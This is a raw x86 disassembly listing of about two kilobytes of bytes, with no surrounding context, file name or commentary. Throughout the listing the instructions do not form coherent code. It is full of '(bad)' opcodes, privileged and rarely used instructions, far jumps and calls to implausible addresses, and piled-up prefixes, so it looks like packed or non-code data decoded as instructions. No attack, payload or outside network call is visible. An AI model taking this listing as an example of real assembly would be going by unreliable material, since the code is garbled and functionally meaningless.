  428c96:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  428c9d:	(bad)  
  428c9e:	mov    ebx,eax
  428ca0:	loopne 0x428ce7
  428ca2:	dec    ebp
  428ca3:	mov    ecx,DWORD PTR [edi]
  428ca5:	cld    
  428ca6:	push   eax
  428ca7:	xchg   DWORD PTR [ebx],esi
  428ca9:	add    DWORD PTR [ebx],ebp
  428cab:	add    BYTE PTR [ebx],ch
  428cad:	or     BYTE PTR [ecx],bh
  428caf:	dec    ecx
  428cb0:	loopne 0x428cb5
  428cb2:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  428cb8:	push   ebp
  428cb9:	add    DWORD PTR [ebx+0x55100800],eax
  428cbf:	dec    ebp
  428cc0:	jmp    0x428c4b
  428cc2:	mov    esp,DWORD PTR [eax]
  428cc4:	sbb    dl,dl
  428cc6:	inc    eax
  428cc7:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  428ccd:	add    BYTE PTR [ebx+0x74528555],cl
  428cd3:	push   ebp
  428cd4:	div    DWORD PTR [ebx]
  428cd6:	and    eax,DWORD PTR [ebx]
  428cd8:	add    edx,DWORD PTR [edx-0x30]
  428cdb:	jno    0x428c68
  428cdd:	inc    DWORD PTR [eax+eiz*1]
  428ce0:	inc    ebp
  428ce1:	push   eax
  428ce2:	push   eax
  428ce3:	mov    esp,DWORD PTR [edi-0x74beff1c]
  428ce9:	mov    edi,esp
  428ceb:	push   eax
  428cec:	inc    ebp
  428ced:	enter  0x458b,0x8
  428cf1:	push   ecx
  428cf2:	(bad)  
  428cf3:	call   0x10c96cb
  428cf8:	pop    ss
  428cf9:	push   ebp
  428cfa:	mov    ecx,DWORD PTR [ebx+0x489408]
  428d00:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  428d06:	push   ecx
  428d07:	jo     0x428cf1
  428d09:	inc    DWORD PTR [edi]
  428d0b:	or     BYTE PTR [eax],al
  428d0d:	call   0xcd9457
  428d12:	fmul   QWORD PTR [ebp+0x55]
  428d15:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  428d1b:	mov    bh,0x8c
  428d1d:	adc    al,0x98
  428d1f:	dec    esp
  428d20:	xor    bl,BYTE PTR [eax]
  428d22:	mov    ecx,DWORD PTR [ebp+0xc]
  428d25:	mov    eax,DWORD PTR [ebp-0x4]
  428d28:	mov    esi,DWORD PTR [edi-0x3148f924]
  428d2e:	push   es
  428d2f:	retf   
  428d30:	mov    BYTE PTR [ebp-0x30],0x3b
  428d34:	inc    ebp
  428d35:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  428d3c:	retf   0x83fc
  428d3f:	into   
  428d40:	dec    ebp
  428d41:	retf   
  428d42:	mov    ecx,DWORD PTR [ebp-0x74]
  428d45:	mov    eax,DWORD PTR [eax]
  428d47:	fdiv   QWORD PTR [ebx]
  428d49:	mov    bh,0x3
  428d4b:	push   es
  428d4c:	mov    esi,ecx
  428d4e:	sbb    cl,dl
  428d50:	dec    ebp
  428d51:	sar    DWORD PTR [ebx],cl
  428d53:	push   ebp
  428d54:	jne    0x428d65
  428d56:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  428d5c:	lea    ebx,[eax]
  428d5e:	call   0xf4cc1925
  428d63:	sbb    dh,dl
  428d65:	add    edx,ebx
  428d67:	push   ebp
  428d68:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  428d6e:	push   ecx
  428d6f:	mov    DWORD PTR [eax-0x30],edx
  428d72:	test   DWORD PTR [edx],eax
  428d74:	xadd   esp,esi
  428d77:	pop    es
  428d78:	add    cl,dl
  428d7a:	mov    eax,ecx
  428d7c:	or     al,0x45
  428d7e:	(bad)  
  428d7f:	push   eax
  428d80:	add    DWORD PTR [edx+0x0],eax
  428d83:	add    ecx,DWORD PTR [ecx]
  428d85:	and    dh,cl
  428d87:	call   0xc69657
  428d8c:	add    DWORD PTR [ebp+0x0],edx
  428d8f:	mov    esp,DWORD PTR [ebp+0x18]
  428d92:	add    BYTE PTR [eax+0x44],cl
  428d95:	xor    eax,DWORD PTR [eax]
  428d97:	add    esp,DWORD PTR [esi+0x3b]
  428d9a:	inc    ebp
  428d9b:	je     0x428d20
  428d9d:	push   ecx
  428d9e:	or     cl,BYTE PTR [ebp-0x77]
  428da1:	add    eax,esi
  428da3:	or     al,0x5e
  428da5:	inc    eax
  428da6:	add    BYTE PTR [ebx],al
  428da8:	data16 and BYTE PTR [ebp+0x50],al
  428dac:	sub    DWORD PTR [ecx],0xffffffe8
  428daf:	add    BYTE PTR [ebp-0x75],ah
  428db2:	add    BYTE PTR [eax],bl
  428db4:	enter  0x894d,0x8b
  428db8:	int3   
  428db9:	loopne 0x428ded
  428dbb:	rol    BYTE PTR [eax],0x33
  428dbe:	lea    cx,[ebp+0xa]
  428dc2:	data16 jb 0x428e0a
  428dc5:	add    BYTE PTR [ebx+0x44890855],cl
  428dcb:	sbb    ah,al
  428dcd:	inc    ebp
  428dce:	lldt   WORD PTR ss:[edx+0x66]
  428dd3:	xor    ecx,DWORD PTR [eax]
  428dd5:	sub    edi,esp
  428dd7:	mov    eax,DWORD PTR [eax]
  428dd9:	or     al,0x66
  428ddb:	ror    edx,cl
  428ddd:	dec    ebp
  428dde:	inc    ebp
  428ddf:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  428de5:	cld    
  428de6:	or     BYTE PTR [edi+0x4501dd],dl
  428dec:	(bad)  
  428ded:	into   
  428dee:	out    dx,al
  428def:	retf   
  428df0:	(bad)  
  428df1:	dec    ebp
  428df2:	mov    al,0x8b
  428df4:	jmp    0xea27:0x450ac320
  428dfb:	xchg   esi,ebp
  428dfd:	add    edi,eax
  428dff:	add    BYTE PTR [eax+0x3f52e955],bh
  428e05:	push   ebp
  428e06:	inc    ebp
  428e07:	xor    ebx,esp
  428e09:	add    ebp,esi
  428e0b:	push   edx
  428e0c:	push   bp
  428e0e:	inc    ebp
  428e0f:	(bad)  
  428e10:	in     eax,dx
  428e11:	push   esp
  428e12:	(bad)  
  428e13:	inc    edx
  428e15:	sbb    al,0x33
  428e17:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  428e1e:	add    BYTE PTR [ebp+0x43],0x8b
  428e22:	jmp    0xf98b:0x100041c8
  428e29:	xor    esi,DWORD PTR [edx+0x3]
  428e2c:	mov    ecx,DWORD PTR [edi]
  428e2e:	fmul   DWORD PTR [edx]
  428e30:	add    BYTE PTR [eax],al
  428e32:	lea    eax,[ebx-0x4700273c]
  428e38:	add    al,0x4f
  428e3a:	pop    DWORD PTR [eax]
  428e3c:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  428e42:	push   edx
  428e43:	inc    WORD PTR [ebp+0x8]
  428e47:	mov    eax,0x514f4d
  428e4c:	(bad)
  428e50:	add    al,al
  428e52:	xor    DWORD PTR [ebx-0x74baf730],eax
  428e58:	test   DWORD PTR [esi+0x74],esp
  428e5b:	inc    ebp
  428e5c:	mov    DWORD PTR [eax+0xa4f08],edi
  428e62:	add    BYTE PTR [ecx-0x76c435bb],cl
  428e68:	or     dh,cl
  428e6a:	or     eax,0x8b8d5045
  428e6f:	inc    ebp
  428e70:	mov    WORD PTR [ecx+0x3b8a00],?
  428e76:	jne    0x428eab
  428e78:	mov    edi,DWORD PTR [edx+0x8f3a18]
  428e7e:	add    DWORD PTR [ebx],eax
  428e80:	add    bh,bh
  428e82:	adc    DWORD PTR [eax],ecx
  428e84:	adc    DWORD PTR [ebp+0x55],edi
  428e87:	push   es
  428e88:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  428e8e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  428e95:	inc    ebp
  428e96:	mov    esp,edi
  428e98:	or     al,0xdc
  428e9a:	push   eax
  428e9b:	(bad)  
  428e9c:	jne    0x428e52
  428e9e:	call   0x3a878f
  428ea3:	inc    ebp
  428ea4:	rol    dl,0x84
  428ea7:	out    dx,al
  428ea8:	add    bh,al
  428eaa:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  428eb1:	(bad)  
  428eb2:	and    al,al
  428eb4:	fs in  eax,dx
  428eb6:	inc    DWORD PTR [ebp-0x7b]
  428eb9:	js     0x428eca
  428ebb:	leave  
  428ebc:	scas   al,BYTE PTR es:[edi]
  428ebd:	inc    esp
  428ebe:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  428ec5:	or     BYTE PTR [ebx-0x97717c5],0x83
  428ecc:	call   DWORD PTR [edi]
  428ece:	shr    ah,0x84
  428ed1:	xchg   DWORD PTR [eax],eax
  428ed3:	add    DWORD PTR [eax],eax
  428ed5:	add    bh,bh
  428ed7:	dec    ebp
  428ed8:	and    BYTE PTR [ecx-0x38],dl
  428edb:	push   eax
  428edc:	dec    DWORD PTR [ebx+0xfd885]
  428ee2:	mov    BYTE PTR [ebp+0x508bac00],cl
  428ee8:	mov    WORD PTR [ecx+0x0],ss
  428eeb:	lea    ecx,[ebx+0x108b20d8]
  428ef1:	mov    WORD PTR [edx],ds
  428ef3:	add    BYTE PTR [edi+0xff01ff],al
  428ef9:	mov    ecx,DWORD PTR [ebp-0x28]
  428efc:	push   ecx
  428efd:	shl    BYTE PTR [ebp+0x3a],0x8b
  428f01:	inc    ebp
  428f02:	in     al,0xeb
  428f04:	jno    0x428e91
  428f06:	push   edx
  428f07:	mov    DWORD PTR [eax-0x28],edx
  428f0a:	mov    eax,DWORD PTR [ebp+0x20]
  428f0d:	je     0x428e96
  428f0f:	mov    eax,DWORD PTR [ecx]
  428f11:	sbb    BYTE PTR [eax],al
  428f13:	pop    DWORD PTR [eax]
  428f15:	add    esi,eax
  428f17:	add    bl,al
  428f19:	adc    DWORD PTR [edi],esi
  428f1b:	jmp    0x8bcddf6d
  428f20:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  428f27:	jne    0x428eb4
  428f29:	mov    ecx,DWORD PTR [eax]
  428f2b:	in     al,0x75
  428f2d:	pop    DWORD PTR [ecx+0x5001]
  428f33:	push   edx
  428f34:	inc    DWORD PTR [ebx]
  428f36:	adc    BYTE PTR [ecx+0x45721cc6],cl
  428f3c:	add    BYTE PTR [edi+0x9],dl
  428f3f:	call   DWORD PTR [esi]
  428f41:	and    dl,al
  428f43:	and    bh,bh
  428f45:	inc    edi
  428f47:	test   eax,edx
  428f49:	sldt   ebx
  428f4c:	cmp    DWORD PTR [eax],eax
  428f4e:	pushf  
  428f4f:	(bad)  
  428f50:	jmp    0x428f5e
  428f52:	mov    eax,edi
  428f54:	or     al,0x75
  428f56:	inc    eax
  428f57:	call   0x42865f
  428f5c:	mov    eax,eax
  428f5e:	loopne 0x428ee4
  428f60:	inc    ebp
  428f61:	add    BYTE PTR [ebx+0x1451c00],cl
  428f67:	mov    eax,DWORD PTR [ebp+0x20]
  428f6a:	add    edi,ecx
  428f6c:	add    BYTE PTR [eax],ch
  428f6e:	cmp    edi,0x18
  428f71:	test   DWORD PTR [ebp+0xf],esi
  428f74:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  428f7b:	jne    0x428f7f
  428f7d:	call   0xffa18a42
  428f82:	leave  
  428f83:	rcr    BYTE PTR [esp+eax*4],0x55
  428f87:	add    ah,ch
  428f89:	add    BYTE PTR [edi-0x48fef979],dh
  428f8f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  428f96:	inc    esp
  428f97:	mov    ebx,DWORD PTR [eax]
  428f99:	fcom   st(2)
  428f9b:	add    BYTE PTR [edi],bl
  428f9d:	lea    ecx,[eax-0x18]
  428fa0:	(bad)  
  428fa1:	push   DWORD PTR [ecx]
  428fa3:	call   0xffb4dd05
  428fa8:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  428fac:	fstp   DWORD PTR [esi+ebx*8]
  428faf:	push   ebp
  428fb0:	pop    ebp
  428fb1:	mov    esi,DWORD PTR [edx-0x38]
  428fb4:	add    DWORD PTR [eax],0x28
  428fb7:	mov    edi,DWORD PTR [ebx]
  428fb9:	xor    esi,DWORD PTR [edx+0x3]
  428fbc:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  428fc0:	pop    ebp
  428fc1:	or     al,0x4
  428fc3:	inc    ecx
  428fc4:	push   ebp
  428fc5:	(bad)  
  428fc6:	in     al,dx
  428fc7:	or     ah,ch
  428fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fca:	xbegin 0xffc805c0
  428fd0:	clc    
  428fd1:	adc    al,0x45
  428fd3:	idiv   BYTE PTR [ecx]
  428fd5:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  428fdc:	test   DWORD PTR [eax+0x665300f8],ebx
  428fe2:	add    BYTE PTR [ecx+0x66],dh
  428fe5:	add    eax,DWORD PTR [ebp+0x52]
  428fe8:	adc    eax,0x20
  428feb:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  428ff1:	test   DWORD PTR [eax],eax
  428ff3:	clc    
  428ff4:	data16 or al,BYTE PTR [ebp+0x45]
  428ff8:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  428fff:	rol    BYTE PTR [ebp+0x45],1
  429002:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  429008:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  42900e:	push   ebx
  42900f:	add    BYTE PTR [eax+0x0],dl
  429012:	push   ecx
  429013:	jge    0x429048
  429015:	add    BYTE PTR [esi+0x4],dl
  429018:	jne    0x42907f
  42901a:	mov    edx,0x457200
  42901f:	jmp    0x428fe3
  429021:	xor    edi,DWORD PTR [ebx]
  429023:	pop    edi
  429024:	cvtdq2ps xmm7,xmm0
  429027:	ret    0x0
  42902a:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  429030:	xor    ecx,DWORD PTR [edi]
  429032:	add    eax,DWORD PTR [ecx+0x3b]
  429035:	push   ebx
  429036:	rdpmc  
  429038:	out    0x8d,al
  42903a:	add    BYTE PTR [eax],cl
  42903c:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  429042:	ret    0x450c
  429045:	sbb    al,0x8b
  429047:	cmp    eax,esi
  429049:	or     cl,al
  42904b:	or     al,0xc2
  42904d:	pop    eax
  42904e:	inc    ebp
  42904f:	add    ecx,DWORD PTR [edi]
  429051:	add    esi,DWORD PTR [ebp+0x39]
  429054:	invd   
  429056:	jge    0x429062
  429058:	mov    eax,0x478ac0
  42905d:	cli    
  42905e:	xor    esp,ecx
  429060:	mov    ebx,0x5b8ac0
  429065:	ret    0x33
  429068:	mov    eax,0x833a8b
  42906d:	sub    BYTE PTR [ebx],al
  42906f:	inc    ebp
  429070:	data16 cmp al,bh
  429073:	pushf  
  429074:	inc    bh
  429076:	mov    esp,esp
  429078:	hlt    
  429079:	test   DWORD PTR [ebp-0x8],esi
  42907c:	mov    eax,DWORD PTR [ebp-0x14]
  42907f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429085:	dec    edi
  429086:	or     BYTE PTR [eax],al
  429088:	jne    0x429013
  42908a:	mov    esi,esp
  42908c:	call   0x77a91c51
  429091:	inc    ebp
  429092:	mov    DWORD PTR [eax+0x984f0c],edi
  429098:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42909e:	add    BYTE PTR [esi+0x7d],ah
  4290a1:	inc    ebp
  4290a2:	mov    bx,WORD PTR [ebp+0x8]
  4290a6:	add    DWORD PTR [ebp+0x50],0x30c008b
  4290ad:	inc    ebp
  4290ae:	mov    bx,di
  4290b1:	lock test BYTE PTR [ecx+0x7000801],bh
  4290b8:	jge    0x42907b
  4290ba:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  4290c0:	cli    
  4290c1:	xor    bl,bh
  4290c3:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4290c9:	test   BYTE PTR [eax],cl
  4290cb:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4290d2:	cmp    ebp,eax
  4290d4:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4290db:	test   BYTE PTR [ebp+0x1],bh
  4290de:	mov    ebx,0x458a00
  4290e3:	xor    esi,DWORD PTR [ebx]
  4290e5:	add    esp,DWORD PTR [esi-0x77]
  4290e8:	pop    ebp
  4290e9:	loopne 0x429151
  4290eb:	inc    ebp
  4290ec:	clc    
  4290ed:	xor    edi,DWORD PTR [ebx]
  4290ef:	add    esi,DWORD PTR [edx-0x77]
  4290f2:	data16 fdivr QWORD PTR [ebp-0x49]
  4290f6:	mov    ebx,0xb78afc
  4290fb:	hlt    
  4290fc:	xor    esi,DWORD PTR [esi]
  4290fe:	data16 add BYTE PTR [ebp+0x66],bl
  429102:	data16 lock clc 
  429105:	cmp    eax,DWORD PTR ss:[eax]
  429108:	ja     0x429170
  42910a:	psubq  mm7,QWORD PTR [ebp-0x4]
  42910e:	ltr    WORD PTR [ebp+0x66]
  429112:	add    esi,eax
  429114:	add    di,WORD PTR [ebp+0x2b]
  429118:	data16 data16 jge 0x429199
  42911c:	mov    ebx,0xe08a8b
  429121:	jge    0x429156
  429123:	data16 data16 xor al,0x5d
  429127:	data16 data16 jne 0x429123
  42912b:	mov    edi,DWORD PTR [ebx]
  42912d:	fdiv   QWORD PTR [edx+0x7d]
  429130:	data16 data16 jge 0x429168
  429134:	mov    ebx,0x758a66
  429139:	mov    esi,0x667233
  42913e:	pop    ebp
  42913f:	or     BYTE PTR [esi+0x0],ah
  429142:	clc    
  429143:	mov    edi,DWORD PTR [ebx]
  429145:	lock ja 0x4290d3
  429148:	(bad)  
  42914a:	jge    0x429143
  42914c:	invd   
  42914e:	pop    ebp
  42914f:	add    BYTE PTR [ebx],al
  429151:	(bad)  
  429152:	cmp    di,WORD PTR [ebp+0xf]
  429156:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42915a:	mov    bx,WORD PTR [ebp-0x10]
  42915e:	pop    bp
  429160:	fbstp  TBYTE PTR [ebx]
  429162:	test   DWORD PTR [ebx],eax
  429164:	add    BYTE PTR [ebx],bh
  429166:	add    BYTE PTR [esi+0x7d],ah
  429169:	jge    0x4290f6
  42916b:	data16 in al,dx
  42916d:	pop    ebp
  42916e:	stc    
  42916f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429176:	mov    edi,ebx
  429178:	in     al,dx
  429179:	test   BYTE PTR [ebp+0x0],bh
  42917c:	mov    eax,DWORD PTR [eax]
  42917e:	call   0xbd3f8b0e
  429183:	ss cwde 
  429185:	add    BYTE PTR [edx],dh
  429187:	mov    bx,di
  42918a:	call   0x8b4b0f1a
  42918f:	add    ebp,esp
  429191:	mov    bx,di
  429194:	jnp    0x4291bc
  429196:	mov    DWORD PTR [ebx+0x367df808],ecx
  42919c:	mov    eax,DWORD PTR [eax]
  42919e:	call   0x7c3e1d09
  4291a3:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4291a9:	data16 data16 fistp WORD PTR [ebp+0xe]
  4291ae:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  4291b8:	fisttp WORD PTR [ecx-0x7401f77b]
  4291be:	(bad)  
  4291bf:	cld    
  4291c0:	jne    0x4291f8
  4291c2:	xor    eax,DWORD PTR [eax]
  4291c4:	mov    esp,DWORD PTR [esi-0x10]
  4291c7:	sti    
  4291c8:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4291cf:	data16 adc bl,bh
  4291d2:	push   ebp
  4291d3:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  4291da:	mov    WORD PTR [eax],es
  4291dc:	cwde   
  4291dd:	data16 xor bh,bl
  4291e0:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4291e6:	mov    esp,DWORD PTR [esi-0x14]
  4291e9:	fisttp WORD PTR [ebx-0x3748a9f2]
  4291ef:	or     al,0x2b
  4291f1:	mov    bh,0xba
  4291f3:	hlt    
  4291f4:	mov    bh,bl
  4291f6:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4291fc:	dec    edi
  4291fd:	or     al,0x0
  4291ff:	mov    edi,DWORD PTR [ebx]
  429201:	or     BYTE PTR [ebp+0x3b],dh
  429204:	mov    ecx,DWORD PTR [edi]
  429206:	fdivr  QWORD PTR [ebx-0x7499ff83]
  42920c:	xor    al,0xd8
  42920e:	pop    bp
  429210:	lock xor esi,DWORD PTR [ebx]
  429213:	lea    esp,[esi+0x1f]
  429216:	icebp  
  429217:	jb     0x42921d
  429219:	add    al,al
  42921b:	jge    0x429229
  42921d:	mov    eax,eax
  42921f:	fsubr  st,st(3)
  429221:	pop    ebp
  429222:	mov    esi,DWORD PTR [ebx]
  429224:	in     al,0x8d
  429226:	rcr    DWORD PTR [edi],0xc2
  429229:	jb     0x429289
  42922b:	add    cl,cl
  42922d:	jge    0x42923b
  42922f:	mov    edx,DWORD PTR [ebp-0x20]
  429232:	in     al,dx
  429233:	pop    ebp
  429234:	data16 data16 or BYTE PTR [esi+edi*4],bh
  429239:	data16 cmp bh,BYTE PTR [ebp+0x0]
  42923d:	mov    ebp,DWORD PTR [ebx]
  42923f:	fdivr  QWORD PTR [esi+0x668a5d]
  429245:	cmp    al,0x33
  429247:	mov    si,0x4f7d
  42924b:	mov    eax,DWORD PTR [eax]
  42924d:	lock inc ebp
  42924f:	mov    esi,DWORD PTR [edi]
  429251:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  429258:	clc    
  429259:	(bad)  
  42925a:	cmp    edi,DWORD PTR [ebx]
  42925c:	je     0x42926d
  42925e:	push   ebx
  42925f:	loopne 0x429270
  429261:	dec    ecx
  429263:	mov    ebp,DWORD PTR [eax-0x1c]
  429266:	int    0xf1
  429268:	mov    esi,0x703084d
  42926d:	orps   xmm6,xmm1
  429270:	add    BYTE PTR [ebp+0x66],dh
  429273:	jmp    0x429240
  429275:	mov    eax,DWORD PTR [ebx]
  429277:	lock push ebp
  429279:	ror    DWORD PTR [ebp-0x2972feb3],1
  42927f:	or     bh,dl
  429281:	jb     0x429281
  429283:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429289:	loopne 0x42928b
  42928b:	jne    0x429289
  42928d:	data16 add BYTE PTR [esi+eiz*2],dh
  429291:	mov    ecx,ebx
  429293:	data16 ss icebp 
  429296:	add    BYTE PTR [esi],dh
  429298:	data16 add bl,cl
  42929b:	data16 xor dh,dl
  42929e:	add    BYTE PTR [edx],dh
  4292a0:	data16 add bl,cl
  4292a3:	enterw 0x4df1,0x19
  4292a8:	pop    edi
  4292a9:	jne    0x42922c
  4292ab:	mov    esi,DWORD PTR [edi]
  4292ad:	call   0x77b71e4e
  4292b2:	xor    ebp,DWORD PTR [ebx]
  4292b4:	lea    esp,[esi+0x48]
  4292b7:	repnz in eax,0x3b
  4292ba:	add    BYTE PTR [ebp-0x37],dh
  4292bd:	xor    edx,DWORD PTR [ebp-0x15]
  4292c0:	in     al,dx
  4292c1:	xor    edx,DWORD PTR [esi+0x40]
  4292c4:	mov    DWORD PTR [edi],0x338545fc
  4292ca:	clc    
  4292cb:	add    edi,DWORD PTR [eax]
  4292cd:	pop    edi
  4292ce:	pushf  
  4292cf:	pop    ebx
  4292d0:	call   0xff439297
  4292d5:	mov    edi,eax
  4292d7:	push   ecx
  4292d8:	pop    es
  4292d9:	mov    edi,DWORD PTR [ebx]
  4292db:	push   esi
  4292dc:	inc    ebx
  4292dd:	cld    
  4292de:	js     0x4292e0
  4292e0:	popa   
  4292e1:	data16 (bad) 
  4292e3:	into   
  4292e4:	push   0xb900cd36
  4292e9:	data16 or dh,cl
  4292ec:	pop    es
  4292ed:	xor    ah,BYTE PTR [esi+0x0]
  4292f0:	add    bh,al
  4292f2:	cld    
  4292f3:	cld    
  4292f4:	add    BYTE PTR [ebp+0x38c3f866],al
  4292fa:	ss pushf 
  4292fc:	add    BYTE PTR [esi+0x66],ah
  4292ff:	into   
  429300:	ret    
  429301:	pop    ebp
  429302:	add    al,0x57
  429304:	add    BYTE PTR [edi-0x723c409a],dh
  42930a:	add    edi,edi
  42930c:	jne    0x42935e
  42930e:	lea    edx,[ecx+0x1]
  429311:	mov    ebx,0xd64ff1
  429316:	sar    DWORD PTR [ebx],1
  429318:	test   BYTE PTR [ebp+0x30],dh
  42931b:	mov    DWORD PTR [esp+edi*8-0x76],esp
  42931f:	push   edi
  429320:	xor    BYTE PTR [ebx],0x3b
  429323:	mov    esi,ebx
  429325:	xor    eax,DWORD PTR [eax-0x3c73879a]
  42932b:	xor    BYTE PTR [ebp+0x64],al
  42932e:	pop    ebx
  42932f:	mov    ebx,0x9c3a37
  429334:	je     0x429361
  429336:	xor    edi,DWORD PTR [ebx+0x668a33]
  42933c:	mov    WORD PTR [ebx],?
  42933e:	xor    BYTE PTR [ebx+0x8b4f64],bh
  429344:	pop    edi
  429345:	cmp    ecx,ecx
  429347:	jne    0x42939e
  429349:	mov    ebp,esp
  42934b:	cld    
  42934c:	push   esi
  42934d:	pop    ebx
  42934e:	inc    ebp
  42934f:	stc    
  429350:	aaa    
  429351:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  429358:	clc    
  429359:	test   dl,dl
  42935b:	xor    bh,bh
  42935d:	fs pop si
  429360:	or     bl,al
  429362:	cld    
  429363:	mov    eax,DWORD PTR [eax]
  429365:	push   ecx
  429366:	push   di
  429368:	retf   0x3645
  42936b:	aaa    
  42936c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429373:	clc    
  429374:	add    BYTE PTR [ebx+0x66],bl
  429377:	dec    edx
  429379:	mov    edx,DWORD PTR [edi-0x76]
  42937c:	push   edi
  42937d:	add    al,0xb7
  42937f:	xor    al,0xba
  429381:	cmp    al,0x8d
  429383:	je     0x429384
  429385:	mov    edx,DWORD PTR [eax-0x46]
  429388:	push   ecx
  429389:	lea    edi,[ebx+0x504fff]
  42938f:	push   ecx
  429390:	cmp    edx,DWORD PTR [ebx+0x75]
  429393:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429399:	add    BYTE PTR [ebx],dh
  42939b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4293a1:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  4293a8:	mov    ebx,0x3b3a00
  4293ad:	jne    0x4293da
  4293af:	mov    DWORD PTR [ebx+0x728afc],edi
  4293b5:	xor    esi,DWORD PTR [ebx]
  4293b7:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4293bd:	push   edi
  4293be:	cmp    esp,ebp
  4293c0:	jne    0x4293c2
  4293c2:	sbb    DWORD PTR [eax],0x8085c3fc
  4293c8:	clc    
  4293c9:	inc    ebx
  4293ca:	pop    ebx
  4293cb:	sti    
  4293cc:	add    eax,0xeb8bc075
  4293d1:	cld    
  4293d2:	xor    edi,DWORD PTR ds:0xf8c3855e
  4293d8:	mov    ecx,DWORD PTR [ecx+edx*2]
  4293db:	rol    DWORD PTR [ebp-0x37],0xf
  4293df:	mov    DWORD PTR [eax],ecx
  4293e1:	inc    edi
  4293e2:	(bad)  
  4293e3:	in     eax,0x4
  4293e5:	add    bh,bh
  4293e7:	(bad)  
  4293e8:	mov    esi,0xc38a5e
  4293ed:	mov    esi,DWORD PTR [ebx]
  4293ef:	push   ecx
  4293f0:	mov    edi,0xfc4fc7
  4293f5:	test   DWORD PTR [ebp-0x8],edx
  4293f8:	data16 cmp bh,al
  4293fb:	pushf  
  4293fc:	sub    ebp,eax
  4293fe:	inc    ebp
  4293ff:	(bad)  
  429400:	sub    edi,edi
  429402:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  429408:	inc    ebp
  429409:	add    BYTE PTR [esi+0x2b],ah
  42940c:	or     bh,BYTE PTR [edx+0xf8ac2]
  429412:	cmp    al,0x33
  429414:	mov    edi,DWORD PTR [edx+0x44f81]
  42941a:	(bad)  
  42941b:	cmp    esi,DWORD PTR [ebx]
  42941d:	je     0x4293d7
  42941f:	push   ebx
  429420:	dec    edi
  429421:	str    ecx
  429424:	cmp    ebp,DWORD PTR [eax+0x75]
  429427:	int    0x33
  429429:	mov    edi,0x789085f
  42942e:	mov    eax,DWORD PTR [esp+edi*8]
  429431:	add    cl,cl
  429433:	data16 add al,0xcb
  429436:	push   ebp
  429437:	add    ebp,esp
  429439:	jne    0x429427
  42943b:	(bad)  
  42943c:	mov    DWORD PTR [ecx],0xd685f7ec
  429442:	clc    
  429443:	xlat   BYTE PTR ds:[ebx]
  429444:	inc    ebp
  429445:	mov    edi,DWORD PTR [ecx]
  429447:	push   eax
  429448:	pushf  
  429449:	in     eax,0x8b
  42944b:	add    ah,ch
  42944d:	cld    
  42944e:	push   eax
  42944f:	add    BYTE PTR [ecx+0x66],dl
  429452:	add    eax,0x3672cb
  429457:	add    BYTE PTR [ebp+0x66],al
  42945a:	(bad)  
  42945b:	retf   
  42945c:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429463:	retf   
  429464:	cmp    al,0xc8
  429466:	pushf  
  429467:	jge    0x429430
  429469:	aaa    
  42946a:	cld    
  42946b:	pushf  
  42946c:	test   DWORD PTR [edi-0x8],ebx
  42946f:	je     0x4294b6
  429471:	xor    esi,DWORD PTR ds:0x7020840
  429477:	ror    BYTE PTR [ebp-0x37],0x8d
  42947b:	push   ebp
  42947c:	add    esp,ebp
  42947e:	jb     0x42940b
  429480:	add    BYTE PTR [eax],cl
  429482:	dec    ebp
  429483:	mov    bh,0x81
  429485:	push   esi
  429486:	push   eax
  429487:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42948e:	xor    al,BYTE PTR [eax]
  429490:	mov    edx,DWORD PTR [edi+0x10]
  429493:	(bad)  
  429494:	scas   eax,DWORD PTR es:[edi]
  429495:	xor    bh,BYTE PTR [ebx]
  429497:	add    BYTE PTR [edi],cl
  429499:	mov    ebp,ebp
  42949b:	cld    
